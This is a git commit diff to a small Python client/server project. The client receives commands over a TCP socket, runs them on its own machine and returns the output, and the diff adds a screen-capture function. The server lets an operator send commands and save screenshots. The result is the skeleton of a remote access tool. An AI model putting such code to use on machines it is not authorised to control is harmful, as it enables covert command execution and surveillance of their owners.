fa0a18709c849405755bba0d3f152351435e42f4
eyalgonlod <eyaleigi@gmail.com>
2025-06-20 18:37:52 +0300

    Diffrent Plan for sending and receiving data

--- client.py
+++ client.py
@@ -1,5 +1,10 @@
+import json
 import socket
 import subprocess
+import struct
+import pyautogui
+import io
+
 
 def execute_command(command):
     """Execute a system command and return its output or error."""
@@ -12,6 +17,15 @@ def execute_command(command):
     except Exception as e:
         return f"Error: {str(e)}"
 
+
+def get_screenshot():
+    screenshot = pyautogui.screenshot()
+    img_bytes = io.BytesIO()
+    screenshot.save(img_bytes, format='PNG')
+    img_data = img_bytes.getvalue()
+    return img_data
+
+
 def main():
     # Create a TCP client socket
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -23,19 +37,24 @@ def main():
 
         while True:
             # Receive the command from the server
-            command = client_socket.recv(1024).decode('utf-8')
-            if not command:
+            request_str = client_socket.recv(1024).decode('utf-8')
+            if not request_str:
                 print("No command received or server disconnected.")
                 break
-            print(f"Received command: {command}")
+            print(f"Received command: {request_str}")
+            request = json.loads(request_str)
 
             # Execute the command
-            result = execute_command(command)
+            result = execute_command(request["command"])
             print(f"Command output: {result}")
+            print(len(result))
 
             # Send the result back to the server
+            size = struct.pack(">I", len(result))
+            client_socket.send(size)
             client_socket.send(result.encode('utf-8'))
             print("Result sent to server.")
+
 
     except Exception as e:
         print(f"Error: {e}")
@@ -43,6 +62,7 @@ def main():
         # Close the client socket
         client_socket.close()
         print("Client socket closed.")
+
 
 if __name__ == "__main__":
     main()
--- server.py
+++ server.py
@@ -1,4 +1,37 @@
 import socket
+import json
+import struct
+
+
+def get_command_input(request):
+    command = input("Please enter the wanted command: ")
+    request["command"] = command
+    return request
+
+
+def print_command_output(response):
+    print(f"Received response:\n {response.decode('utf-8')}")
+
+
+def get_screenshot_input(request):
+    return request
+
+
+def handle_screenshot(data):
+    with open('received_screenshot.png', 'wb') as f:
+        f.write(data)
+
+
+actions = {
+    "command": {
+        "input": get_command_input,
+        "output": print_command_output
+    },
+    "screenshot": {
+        "input": get_screenshot_input,
+        "output": handle_screenshot
+    }
+}
 
 
 def get_user_input():
@@ -6,10 +39,18 @@ def get_user_input():
     }
     action = input("Please enter the wanted action (command): ")
     request["type"] = action
-    if action == "command":
-        command = input("Pleae enter the wanted command: ")
-        request["command"] = command
+    if action in actions:
+        actions[action]["input"](request)
+
     return request
+
+
+def receive_all(client_socket, size):
+    data = b''
+    while len(data) < size:
+        data += client_socket.recv(size - len(data))
+    return data
+
 
 def main():
     # Create server socket
@@ -25,26 +66,24 @@ def main():
 
         while True:
             # Get and send command
-            command = get_user_input()
-            if not command:
+            request = get_user_input()
+            if not request:
                 print("No valid command provided. Closing connection.")
                 break
-            client_socket.send(command.encode('utf-8'))
-            print(f"Sent command: {command}")
-
+            client_socket.send(json.dumps(request).encode('utf-8'))
+            print(f"Sent command: {request}")
+            size = struct.unpack(">I", client_socket.recv(4))[0]
             # Receive response from client
-            response = client_socket.recv(1024).decode('utf-8')
-            if not response:
-                print("No response received or client disconnected.")
-                break
-            print(f"Received response: {response}")
+            response = receive_all(client_socket, size)
+            if request["type"] in actions:
+                actions[request["type"]]["output"](response)
 
     except Exception as e:
         print(f"Error: {e}")
     finally:
-        client_socket.close()
         server_socket.close()
         print("Sockets closed.")
+
 
 if __name__ == "__main__":
     main()
